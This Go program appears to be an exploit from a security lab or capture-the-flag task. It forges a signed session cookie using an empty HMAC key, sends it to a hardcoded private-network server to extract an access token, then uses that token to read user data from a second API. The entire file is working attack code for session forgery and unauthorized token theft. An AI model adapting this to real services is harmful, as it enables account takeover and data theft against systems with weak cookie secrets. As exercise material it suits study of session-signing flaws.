package main

import (
	"1_session_generation/pkg/api"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"github.com/gorilla/securecookie"
	log "github.com/sirupsen/logrus"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"time"
)

func encode(value []byte) []byte {
	encoded := make([]byte, base64.URLEncoding.EncodedLen(len(value)))
	base64.URLEncoding.Encode(encoded, value)
	return encoded
}

func getCookieSession(ts int, tokenKey string) string {
	a:=securecookie.GobEncoder{}
	b, _ := a.Serialize(map[interface{}]interface{} {"tokenKey": tokenKey})
	b = encode(b)
	b = []byte(fmt.Sprintf("session|%d|%s|", ts, b))
	mac := hmac.New(sha256.New, []byte{})
	mac.Write(b[:len(b)-1])
	hash := mac.Sum(nil)
	b = append(b, hash...)[len("session")+1:]
 	b = encode(b)
	return string(b)
}


func main() {
	if len(os.Args) < 1 {
		log.Errorf("Usage: %s <TOKEN_KEY>", os.Args[0])
		return
	}
	TokenKey := os.Args[1]
	patternRegExp, _ := regexp.Compile(`TOKEN: \w{16}`)

	session := getCookieSession(int(time.Now().Unix()), TokenKey)

	req, _ := http.NewRequest("GET", "http://10.118.103.11:8080/token", nil)
	req.AddCookie(&http.Cookie{Name: "session", Value: session})

	client := &http.Client{}
	resp, _ := client.Do(req)
	if resp.StatusCode == 200 {
		log.Infof("session=%s", session)
		responseData, _ := ioutil.ReadAll(resp.Body)
		response := patternRegExp.Find(responseData)
		log.Info(string(response))
		token := string(response[len("TOKEN: "):])
		c := api.NewClient("10.118.103.11:9090", TokenKey, token)
		user, err := c.GetUser(TokenKey)
		if err != nil {
			log.Error(err)
		}
		fmt.Println(user.Description)
	} else {
		log.Warn("Not found")
	}
}
